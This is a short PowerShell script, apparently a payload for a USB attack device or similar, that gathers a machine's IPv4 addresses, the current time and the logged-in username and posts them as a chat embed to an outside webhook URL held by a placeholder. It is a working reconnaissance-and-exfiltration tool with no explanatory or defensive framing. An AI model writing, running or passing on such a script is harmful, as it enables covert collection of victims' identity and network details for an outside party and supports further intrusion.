$webhookUrl = "WEBHOOK"
$content = (Get-NetIPAddress -AddressFamily IPV4).IPAddress | Format-Table -AutoSize | Out-String
$content = $content+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
[System.Collections.ArrayList]$embedArray = @()
$title       = 'IP Address Powershell'
$description = '```'+$content+'```'
$color       = '000111'
#Create embed object
$embedObject = [PSCustomObject]@{
    title       = $title
    description = $description
    color       = $color
}
#Add embed object to array
$embedArray.Add($embedObject) | Out-Null
#Create the payload
$payload = [PSCustomObject]@{
    'username' = 'IP Address'
    embeds = $embedArray
}
#Send over payload, converting it to JSON
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'